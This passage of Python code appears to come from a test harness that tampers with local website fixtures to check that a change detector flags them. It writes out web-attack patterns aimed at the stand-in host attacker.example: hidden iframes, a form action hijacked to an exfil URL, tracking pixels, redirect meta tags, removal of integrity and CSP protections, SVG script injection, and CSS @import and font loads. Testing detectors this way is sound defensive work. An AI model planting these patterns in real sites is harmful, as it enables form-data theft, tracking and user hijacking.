    can load attacker content for cookie/state exfiltration. Detected
    via structure (iframe element count) + key_attributes (iframe.src).
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "iframe_injection", "index.html missing")
    html = target.read_text(encoding="utf-8")
    iframe = (
        '<iframe src="https://attacker.example/spy" '
        'width="1" height="1" data-afr-tamper="1" '
        'style="position:absolute;left:-9999px"></iframe>'
    )
    if "</body>" in html:
        html = html.replace("</body>", f"{iframe}</body>", 1)
    else:
        html += iframe
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="iframe_injection",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected hidden 1x1 <iframe src=attacker> - clickjacking/tracking",
        details={"iframe_src": "https://attacker.example/spy"},
    )


@_prereqs("index_html", "form_action")
def mutate_html_form_action_hijack(site_dir: Path, run_dir: Path) -> Mutation:
    """Change first <form action="..."> to point at attacker.

    Form-hijack: any submission of the form (login, contact form, etc.)
    POSTs to the attacker. Caught via form.action in KEY_ATTRIBUTES.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "form_action_hijack", "index.html missing")
    html = target.read_text(encoding="utf-8")
    new_html, n = re.subn(
        r'(<form\s[^>]*\baction=)"([^"]*)"',
        r'\1"https://attacker.example/exfil"',
        html,
        count=1,
        flags=re.IGNORECASE,
    )
    if n == 0:
        return skipped(site_dir, "html", "form_action_hijack", "no <form action> found")
    target.write_text(new_html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="form_action_hijack",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Hijacked first <form action> to attacker URL - form data exfil",
        details={"new_action": "https://attacker.example/exfil"},
    )


@_prereqs("index_html", "img_src")
@_prereqs("index_html", "img_src")
def mutate_html_img_src_swap(site_dir: Path, run_dir: Path) -> Mutation:
    """Swap first <img src> to attacker domain. Tracks user via image load."""
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "img_src_swap", "index.html missing")
    html = target.read_text(encoding="utf-8")
    new_html, n = re.subn(
        r'(<img\s[^>]*\bsrc=)"([^"]*)"',
        r'\1"https://attacker.example/track.gif"',
        html,
        count=1,
        flags=re.IGNORECASE,
    )
    if n == 0:
        return skipped(site_dir, "html", "img_src_swap", "no <img src> found")
    target.write_text(new_html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="img_src_swap",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Swapped first <img src> to attacker URL - tracking pixel",
        details={"new_src": "https://attacker.example/track.gif"},
    )


@_prereqs("index_html", "script_integrity")
def mutate_html_integrity_strip(site_dir: Path, run_dir: Path) -> Mutation:
    """Remove `integrity="..."` from the first <script> that has one.

    SRI (Subresource Integrity) is what prevents a CDN-compromise
    attack: even if cdn.example serves malicious JS, the browser
    refuses to execute when the hash doesn't match. Stripping
    integrity=  re-opens that vector.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "integrity_strip", "index.html missing")
    html = target.read_text(encoding="utf-8")
    new_html, n = re.subn(
        r'\s+integrity="[^"]*"',
        "",
        html,
        count=1,
        flags=re.IGNORECASE,
    )
    if n == 0:
        return skipped(site_dir, "html", "integrity_strip", "no integrity= attr found")
    target.write_text(new_html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="integrity_strip",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Stripped integrity= from a <script> - SRI bypass",
        details={"note": "removes the only defense against CDN tampering"},
    )


@_prereqs("index_html", "head_close")
def mutate_html_meta_http_equiv_refresh(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject `<meta http-equiv="refresh" content="0;url=attacker">`.

    The refresh meta tag forces an immediate browser redirect at page
    load - hijacks the user before they see anything. Hard to spot
    visually because the redirect happens before render. Should flag
    via the new <meta> in the structural element-count diff.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(
            site_dir, "html", "meta_http_equiv_refresh", "index.html missing"
        )
    html = target.read_text(encoding="utf-8")
    refresh_tag = (
        '<meta http-equiv="refresh" '
        'content="0;url=https://attacker.example/redirected" '
        'data-afr-tamper="1">'
    )
    if "</head>" in html:
        html = html.replace("</head>", f"{refresh_tag}</head>", 1)
    else:
        return skipped(site_dir, "html", "meta_http_equiv_refresh", "no </head> found")
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="meta_http_equiv_refresh",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected meta refresh - browser auto-redirects on page load",
        details={"redirect_url": "https://attacker.example/redirected"},
    )


@_prereqs("index_html", "head_close")
def mutate_html_csp_meta_strip(site_dir: Path, run_dir: Path) -> Mutation:
    """Remove existing CSP `<meta>` (or inject permissive one if none).

    CSP is what blocks inline scripts and external resources. Stripping
    or weakening it re-opens every XSS class. The crawler doesn't
    capture HTTP-header CSP so the meta version is the only chance to
    detect CSP regressions today.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "csp_meta_strip", "index.html missing")
    html = target.read_text(encoding="utf-8")
    new_html, n = re.subn(
        r'<meta[^>]*http-equiv\s*=\s*["\']Content-Security-Policy["\'][^>]*>',
        "",
        html,
        count=1,
        flags=re.IGNORECASE,
    )
    if n == 0:
        permissive = (
            '<meta http-equiv="Content-Security-Policy" '
            "content=\"default-src * 'unsafe-inline' 'unsafe-eval'\" "
            'data-afr-tamper="1">'
        )
        if "</head>" in html:
            new_html = html.replace("</head>", f"{permissive}</head>", 1)
        else:
            return skipped(site_dir, "html", "csp_meta_strip", "no CSP and no </head>")
        action = "added permissive CSP"
    else:
        action = "removed existing CSP"
    target.write_text(new_html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="csp_meta_strip",
        file=relpath(target, run_dir),
        expected="should_flag",
        description=f"CSP weakening: {action}",
        details={"action": action},
    )


@_prereqs("index_html", "aria_attr")
@_prereqs("index_html", "aria_attr")
def mutate_html_aria_strip(site_dir: Path, run_dir: Path) -> Mutation:
    """Strip first `aria-*` attribute. Accessibility regression.

    Most a11y attributes aren't in KEY_ATTRIBUTES so this is largely
    a blind-spot probe - documents the gap. Should flag intent
    because a11y matters as much as visual.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "aria_strip", "index.html missing")
    html = target.read_text(encoding="utf-8")
    new_html, n = re.subn(
        r'\s+aria-(?:label|labelledby|describedby|hidden|live)="[^"]*"',
        "",
        html,
        count=1,
        flags=re.IGNORECASE,
    )
    if n == 0:
        return skipped(site_dir, "html", "aria_strip", "no aria-* attribute found")
    target.write_text(new_html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="aria_strip",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Stripped aria-* attribute - a11y regression",
        details={"note": "aria-* not in KEY_ATTRIBUTES; framework gap"},
    )


@_prereqs("index_html")
def mutate_html_style_block_content(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject a `<style>` block with phishing pseudo-element.

    `<style>` blocks live in HTML, not in css/ files - so the CSS
    asset diff doesn't see them. Only structural HTML diff (style
    element count) catches changes here.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "style_block_content", "index.html missing")
    html = target.read_text(encoding="utf-8")
    injection = (
        '<style data-afr-tamper="1">\n'
        "/* AFR-TAMPER injected */\n"
        "h1, .gi-link { color: #ff0066 !important; }\n"
        "body::before { content: 'PHISH-VIA-INLINE-CSS'; "
        "position: fixed; top: 0; left: 0; z-index: 9999; "
        "background: red; color: white; padding: 4px; }\n"
        "</style>"
    )
    if "</head>" in html:
        html = html.replace("</head>", f"{injection}</head>", 1)
    else:
        html = injection + html
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="style_block_content",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected <style> block with phishing pseudo-element",
        details={"note": "inline style blocks bypass CSS file diff"},
    )


@_prereqs("index_html", "rel_nofollow_etc")
@_prereqs("index_html", "rel_nofollow_etc")
def mutate_html_rel_nofollow_strip(site_dir: Path, run_dir: Path) -> Mutation:
    """Remove `rel="nofollow"` (or `rel="noopener"`) from a link.

    `rel="nofollow"` removal: leaks page rank to wherever the link
    points. `rel="noopener"` removal: opens reverse-tabnabbing
    (target page can navigate the opener via window.opener).
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "rel_nofollow_strip", "index.html missing")
    html = target.read_text(encoding="utf-8")
    new_html, n = re.subn(
        r'\s+rel="(?:nofollow|noopener|noreferrer)[^"]*"',
        "",
        html,
        count=1,
        flags=re.IGNORECASE,
    )
    if n == 0:
        return skipped(
            site_dir,
            "html",
            "rel_nofollow_strip",
            "no rel=nofollow/noopener/noreferrer found",
        )
    target.write_text(new_html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="rel_nofollow_strip",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Stripped rel=nofollow/noopener - SEO leak / tabnabbing",
        details={"note": "rel attribute is in KEY_ATTRIBUTES on <link> only"},
    )


@_prereqs("index_html", "head_close")
def mutate_html_open_graph_meta(site_dir: Path, run_dir: Path) -> Mutation:
    """Mutate or inject an OpenGraph `<meta property="og:title">`.

    OpenGraph meta tags drive social-media preview cards. A hijacked
    og:title can make the page look legitimate in previews while
    hosting malicious content. Tests `extract_meta_info` property
    tracking (post-audit-01KRB5GSSM3J76H9Y2MPTZWPS4).
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "open_graph_meta", "index.html missing")
    html = target.read_text(encoding="utf-8")
    changes = {}
    # 1. Mutate existing og:title
    new_html, n = re.subn(
        r'(<meta\s+[^>]*\bproperty=["\']og:title["\']\s+[^>]*\bcontent=)["\']([^"\']*)["\']',
        lambda m: f'{m.group(1)}"AFR-TAMPER-PHISH"',
        html,
        count=1,
        flags=re.IGNORECASE,
    )
    if n:
        html = new_html
        changes["og:title"] = "→ AFR-TAMPER-PHISH"
    # 2. Inject og:title if none exists
    if not changes:
        og_tag = (
            '<meta property="og:title" content="AFR-TAMPER-PHISH" '
            'data-afr-tamper="1">'
        )
        if "</head>" in html:
            html = html.replace("</head>", f"{og_tag}</head>", 1)
            changes["og:title"] = "injected AFR-TAMPER-PHISH"
        else:
            return skipped(site_dir, "html", "open_graph_meta", "no </head>")
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="open_graph_meta",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Mutated/injected og:title meta tag - social preview poisoning",
        details=changes,
    )


@_prereqs("index_html")
@_prereqs("index_html")
def mutate_html_picture_source(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject a `<picture>` element with a malicious `<source srcset>`.

    Responsive image vector: the browser picks the source based on
    viewport/DPR, so a human auditor eyeballing one screenshot may
    miss the attacker image loaded on a different device. Tests
    `picture` and `source` tag structural counts.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "picture_source", "index.html missing")
    html = target.read_text(encoding="utf-8")
    picture = (
        '<picture data-afr-tamper="1">'
        '<source srcset="https://attacker.example/track-400.jpg 400w, '
        'https://attacker.example/track-800.jpg 800w" '
        'sizes="(max-width: 600px) 400px, 800px">'
        '<img src="https://attacker.example/fallback.jpg" alt="">'
        "</picture>"
    )
    if "</body>" in html:
        html = html.replace("</body>", f"{picture}</body>", 1)
    else:
        html = html + picture
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="picture_source",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected <picture> with attacker srcset - responsive image vector",
        details={"srcset": "https://attacker.example/track-*.jpg"},
    )


@_prereqs("index_html")
@_prereqs("index_html")
def mutate_html_svg_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject an inline `<svg>` containing a tracking script.

    SVG can host inline `<script>` tags that execute in the parent
    document's context. Tests structural detection of `svg` tag counts
    (already in TAG_TYPES but never validated by tamper).
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "svg_injection", "index.html missing")
    html = target.read_text(encoding="utf-8")
    svg = (
        '<svg width="1" height="1" data-afr-tamper="1" '
        'style="position:absolute;left:-9999px">'
        '<script>console.log("AFR-TAMPER-SVG-XSS")</script>'
        "</svg>"
    )
    if "</body>" in html:
        html = html.replace("</body>", f"{svg}</body>", 1)
    else:
        html = html + svg
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="svg_injection",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected <svg> with inline script - SVG XSS vector",
        details={"vector": "svg-inline-script"},
    )


@_prereqs("index_html")
def mutate_html_canvas_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject a hidden `<canvas>` element.

    Canvas can be used for browser fingerprinting or to render
    invisible tracking pixels. Tests `canvas` tag structural count.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "canvas_injection", "index.html missing")
    html = target.read_text(encoding="utf-8")
    canvas = (
        '<canvas width="1" height="1" data-afr-tamper="1" '
        'style="position:absolute;left:-9999px"></canvas>'
    )
    if "</body>" in html:
        html = html.replace("</body>", f"{canvas}</body>", 1)
    else:
        html = html + canvas
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="canvas_injection",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected hidden <canvas> - fingerprinting/tracking vector",
        details={"vector": "canvas-fingerprinting"},
    )


@_prereqs("index_html")
@_prereqs("index_html")
def mutate_html_noscript_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject a `<noscript>` block with a tracking image.

    Noscript content renders only when JS is disabled, making it an
    ideal cloaking vector. Tests `noscript` tag structural count
    (added to TAG_TYPES in post-audit-01KRB5GSSM3J76H9Y2MPTZWPS4).
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "noscript_injection", "index.html missing")
    html = target.read_text(encoding="utf-8")
    noscript = (
        '<noscript data-afr-tamper="1">'
        '<img src="https://attacker.example/noscript-track.gif" width="1" height="1">'
        "</noscript>"
    )
    if "</body>" in html:
        html = html.replace("</body>", f"{noscript}</body>", 1)
    else:
        html = html + noscript
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="noscript_injection",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected <noscript> with tracking pixel - cloaking vector",
        details={"vector": "noscript-cloak"},
    )


# ------------------------------------------------------------------------- #
# CSS mutations (5 patterns)                                                #
# ------------------------------------------------------------------------- #


@_prereqs("css_files")
def mutate_css_color_change(site_dir: Path, run_dir: Path) -> Mutation:
    """Change first `color:` declaration in largest CSS file → magenta.

    Real value mutation - the rendered output WILL be different where
    the rule applies. Should always flag.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "color_change", "no .css files found")
    text = target.read_text(encoding="utf-8")
    pat = re.compile(r"(?<![a-zA-Z-])color\s*:\s*([^;}\n]+)([;}])", re.IGNORECASE)
    m = pat.search(text)
    if not m:
        # Fall back to appending a new rule.
        appended = "\n/* AFR-TAMPER */\n.afr-tamper { color: #ff0066; }\n"
        text = text + appended
        details = {"appended_rule": appended.strip()}
    else:
        text = text[: m.start()] + f"color: #ff0066{m.group(2)}" + text[m.end() :]
        details = {"original": m.group(1).strip(), "new": "#ff0066"}
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="color_change",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="First color: declaration → #ff0066 (magenta)",
        details=details,
    )


@_prereqs("css_files")
def mutate_css_equivalent_rewrite(site_dir: Path, run_dir: Path) -> Mutation:
    """Rewrite a value to a SEMANTICALLY IDENTICAL form: #fff → white.

    Edge case: the bytes change but the rendered result is identical.
    A naive content-diff (which is what the asset comparator does) will
    flag this. A semantic-aware CSS diff would not. Documents the
    framework's stance and warns the operator about expected noise.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "equivalent_rewrite", "no .css files")
    text = target.read_text(encoding="utf-8")
    # Try equivalence pairs in order of likelihood. First match wins.
    pairs = [
        (r"\B#fff\b", "white"),
        (r"\B#000\b", "black"),
        (r"\B#ffffff\b", "white"),
        (r"\B#000000\b", "black"),
        (r"\brgb\(\s*255\s*,\s*255\s*,\s*255\s*\)", "white"),
        (r"\brgb\(\s*0\s*,\s*0\s*,\s*0\s*\)", "black"),
    ]
    applied = None
    for pattern, replacement in pairs:
        new_text, n = re.subn(pattern, replacement, text, count=1)
        if n:
            text = new_text
            applied = {"pattern": pattern, "replaced_with": replacement}
            break
    if not applied:
        return skipped(
            site_dir, "css", "equivalent_rewrite", "no #fff/#000/rgb(...) found"
        )
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="equivalent_rewrite",
        file=relpath(target, run_dir),
        expected="edge_case",
        description="Bytes change, render identical (e.g. #fff → white)",
        details=applied,
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_rule_reorder(site_dir: Path, run_dir: Path) -> Mutation:
    """Move first complete rule to the end of the file.

    Edge case: bytes change, source order changes (which CAN affect
    cascade), but the most common case is it's just noise. A semantic
    CSS diff would compare *rule sets*, not text positions. A naive
    diff flags everything.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "rule_reorder", "no .css files")
    text = target.read_text(encoding="utf-8")
    # Match the first complete `selector { ... }` block. Greedy braces don't
    # nest in CSS at the top level (with the @-rule exception), so simple
    # bracket-balance via regex is sufficient for our test purposes.
    pat = re.compile(r"([^{}@]+\{[^{}]*\})", re.DOTALL)
    m = pat.search(text)
    if not m:
        return skipped(site_dir, "css", "rule_reorder", "no top-level rule found")
    rule = m.group(1)
    text = text[: m.start()] + text[m.end() :] + "\n" + rule + "\n"
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="rule_reorder",
        file=relpath(target, run_dir),
        expected="edge_case",
        description="Moved first rule to end (cascade preserved by spec, bytes differ)",
        details={"rule_preview": _preview(rule, 60)},
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_media_query(site_dir: Path, run_dir: Path) -> Mutation:
    """Change a @media (max-width: Xpx) breakpoint by +50px.

    Real responsive-design regression. The pixel-diff at desktop
    resolution won't catch this (the breakpoint only triggers below
    the width). The asset comparator should catch it as a content
    change. Tests at-rule diffing.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "media_query", "no .css files")
    text = target.read_text(encoding="utf-8")
    pat = re.compile(
        r"(@media[^{]*\(\s*max-width\s*:\s*)(\d+)(px\s*\))",
        re.IGNORECASE,
    )
    m = pat.search(text)
    if not m:
        # Fall back to appending a new media query
        appended = (
            "\n@media (max-width: 999px) { .afr-tamper-media { display: none; } }\n"
        )
        text = text + appended
        details = {"appended": appended.strip()}
    else:
        original_px = int(m.group(2))
        new_px = original_px + 50
        text = (
            text[: m.start()] + m.group(1) + str(new_px) + m.group(3) + text[m.end() :]
        )
        details = {"original_px": original_px, "new_px": new_px}
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="media_query",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="@media breakpoint shifted by 50px (responsive regression)",
        details=details,
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_important(site_dir: Path, run_dir: Path) -> Mutation:
    """Add !important to the first declaration in the file.

    Real cascade behavior change. Bytes differ. Should flag.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "important", "no .css files")
    text = target.read_text(encoding="utf-8")
    pat = re.compile(r"([a-z-]+\s*:\s*[^;}!]+?)([;}])", re.IGNORECASE)
    m = pat.search(text)
    if not m:
        return skipped(site_dir, "css", "important", "no declaration found")
    text = (
        text[: m.start()]
        + m.group(1).rstrip()
        + " !important"
        + m.group(2)
        + text[m.end() :]
    )
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="important",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Added !important to first declaration",
        details={"declaration_first_40": m.group(1).strip()[:40]},
    )


@_prereqs("css_files")
def mutate_css_variable_change(site_dir: Path, run_dir: Path) -> Mutation:
    """Change a CSS custom property (--var) value, or append one.

    Custom properties cascade like normal properties but their effect
    can be widespread (one --primary-color drives every button).
    Real regression class: a designer typo on a custom property
    silently breaks many components.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "variable_change", "no .css files")
    text = target.read_text(encoding="utf-8")
    pat = re.compile(r"(--[a-zA-Z_][\w-]*\s*:\s*)([^;\}\n]+)([;\}])")
    m = pat.search(text)
    if m:
        original = m.group(2).strip()
        text = (
            text[: m.start()]
            + m.group(1)
            + "#ff00ff /* AFR-TAMPER */"
            + m.group(3)
            + text[m.end() :]
        )
        details = {"variable_match": True, "original": original, "new": "#ff00ff"}
    else:
        appended = "\n:root { --afr-tamper-var: #ff00ff; }\n"
        text = text + appended
        details = {"variable_match": False, "appended": appended.strip()}
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="variable_change",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Changed first --custom-property value (or added one)",
        details=details,
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_keyframe_change(site_dir: Path, run_dir: Path) -> Mutation:
    """Modify a @keyframes body if any exist; otherwise add one.

    Keyframe changes affect motion / animation behavior. Easy to miss
    visually because the diff captures one frame. Bytes differ so
    asset comparator catches it.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "keyframe_change", "no .css files")
    text = target.read_text(encoding="utf-8")
    # Match a single @keyframes block. CSS @keyframes can nest but
    # this regex handles the common case (frame definitions inside).
    pat = re.compile(r"(@keyframes\s+[\w-]+\s*\{)([^@]*?)(\}\s*\})", re.DOTALL)
    m = pat.search(text)
    if m:
        # Append a new frame to the body
        new_body = (
            m.group(2) + "\n  50% { transform: rotate(180deg); /* AFR-TAMPER */ }\n"
        )
        text = text[: m.start()] + m.group(1) + new_body + m.group(3) + text[m.end() :]
        details = {"keyframe_match": True}
    else:
        appended = (
            "\n@keyframes afr-tamper-spin { "
            "0% { transform: rotate(0deg); } "
            "100% { transform: rotate(360deg); } "
            "}\n"
        )
        text = text + appended
        details = {"keyframe_match": False, "appended": "afr-tamper-spin"}
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="keyframe_change",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Modified or added an @keyframes block - animation regression",
        details=details,
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_display_none_added(site_dir: Path, run_dir: Path) -> Mutation:
    """Append a rule that hides important content via display:none.

    A real regression class: a stylesheet update accidentally hides
    a critical element. Should always flag because content visually
    disappears (and per-rule diff catches the new rule).
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "display_none_added", "no .css files")
    text = target.read_text(encoding="utf-8")
    appended = (
        "\n/* AFR-TAMPER */\n"
        "h1, .gi-link, .gi-button-primary { display: none !important; }\n"
    )
    text = text + appended
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="display_none_added",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended display:none rule for h1/links/buttons - hides UI",
        details={"selector": "h1, .gi-link, .gi-button-primary"},
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_property_reorder(site_dir: Path, run_dir: Path) -> Mutation:
    """Reorder properties within first rule. Bytes differ, render same.

    Edge case: the per-rule comparator parses property dicts which are
    order-independent, so this should NOT generate any per-property
    diff records. But the FILE content differs, so the file-level
    has_changes still trips. Documents framework's stance.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "property_reorder", "no .css files")
    text = target.read_text(encoding="utf-8")
    # Find first rule with at least 2 properties.
    pat = re.compile(r"([^{}]+)\{([^{}]+)\}", re.DOTALL)
    for m in pat.finditer(text):
        body = m.group(2).strip()
        props = [p.strip() for p in body.split(";") if p.strip() and ":" in p]
        if len(props) < 2:
            continue
        # Reverse the property order
        new_body = "; ".join(reversed(props)) + ";"
        text = text[: m.start()] + m.group(1) + "{ " + new_body + " }" + text[m.end() :]
        target.write_text(text, encoding="utf-8")
        return Mutation(
            site_id=site_dir.name,
            kind="css",
            pattern="property_reorder",
            file=relpath(target, run_dir),
            expected="edge_case",
            description="Reversed property order in first rule - bytes differ, render same",
            details={"property_count": len(props)},
        )
    return skipped(site_dir, "css", "property_reorder", "no rule with 2+ properties")


@_prereqs("css_files")
def mutate_css_import_url_swap(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject `@import url(https://attacker.example/styles.css)` at the top.

    Supply-chain attack via CSS @import: arbitrary additional styles
    loaded from an attacker-controlled origin. Caught via per-rule
    diff (new at-rule appears) and content equality.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "import_url_swap", "no .css files")
    text = target.read_text(encoding="utf-8")
    # @import must come BEFORE any other rule (CSS spec). Prepend.
    injection = "@import url('https://attacker.example/inject.css'); /* AFR-TAMPER */\n"
    text = injection + text
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="import_url_swap",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Prepended @import to attacker.example - CSS supply chain",
        details={"injected_url": "https://attacker.example/inject.css"},
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_font_face_url_swap(site_dir: Path, run_dir: Path) -> Mutation:
    """Add a malicious `@font-face` referencing attacker.example.

    Font-loading is an attack vector: malicious fonts can substitute
    glyphs (e.g. swap "0" with "O" to spoof URLs) or carry exploits
    in font-rendering libraries. Caught via per-rule diff.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "font_face_url_swap", "no .css files")
    text = target.read_text(encoding="utf-8")
    appended = (
        "\n@font-face { /* AFR-TAMPER */\n"
        '  font-family: "AfrTamperFont";\n'
        '  src: url("https://attacker.example/spoof.woff2") format("woff2");\n'
        "}\n"
    )
    text = text + appended
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="font_face_url_swap",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended malicious @font-face from attacker.example",
        details={"font_url": "https://attacker.example/spoof.woff2"},
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_opacity_invisible(site_dir: Path, run_dir: Path) -> Mutation:
    """Append `.gi-link { opacity: 0; }` - links invisible but interactable.

    Sneaky vector: opacity:0 keeps an element clickable but hides it
    visually. Could be used to overlay invisible attack click targets,
    or hide critical content while keeping the layout intact.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "opacity_invisible", "no .css files")
    appended = (
        "\n/* AFR-TAMPER */\n.gi-link, .gi-button-primary { opacity: 0 !important; }\n"
    )
    text = target.read_text(encoding="utf-8") + appended
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="opacity_invisible",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended opacity:0 on links - invisible but clickable",
        details={"selector": ".gi-link, .gi-button-primary"},
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_pointer_events_none(site_dir: Path, run_dir: Path) -> Mutation:
    """Append `.gi-button-primary { pointer-events: none; }`.

    UX-breaking regression: buttons LOOK normal but clicks pass through.
    Real-world: a CSS hot-fix accidentally disables an entire form
    submission button. Caught via per-rule diff.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "pointer_events_none", "no .css files")
    appended = (
        "\n/* AFR-TAMPER */\n"
        ".gi-button-primary, button[type=submit] { pointer-events: none; }\n"
    )
    text = target.read_text(encoding="utf-8") + appended
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="pointer_events_none",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Disabled pointer events on submit buttons - UX/functional regression",
        details={"selector": ".gi-button-primary, button[type=submit]"},
    )


@_prereqs("css_files")
@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_hex_to_rgb(site_dir: Path, run_dir: Path) -> Mutation:
    """Convert first 6-digit hex color to rgb() equivalent. Render identical.

    Edge case: same color, different syntax. Per-rule diff WILL flag
    the property because the value strings differ. Documents the
    "naive content diff" stance.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "hex_to_rgb", "no .css files")
    text = target.read_text(encoding="utf-8")
    pat = re.compile(r"#([0-9a-fA-F]{6})\b")
    m = pat.search(text)
    if m is None:
        return skipped(site_dir, "css", "hex_to_rgb", "no #RRGGBB found")
    hex_value = m.group(1)
    r, g, b = int(hex_value[0:2], 16), int(hex_value[2:4], 16), int(hex_value[4:6], 16)
    rgb = f"rgb({r}, {g}, {b})"
    text = text[: m.start()] + rgb + text[m.end() :]
    target.write_text(text, encoding="utf-8")
    return Mutation(
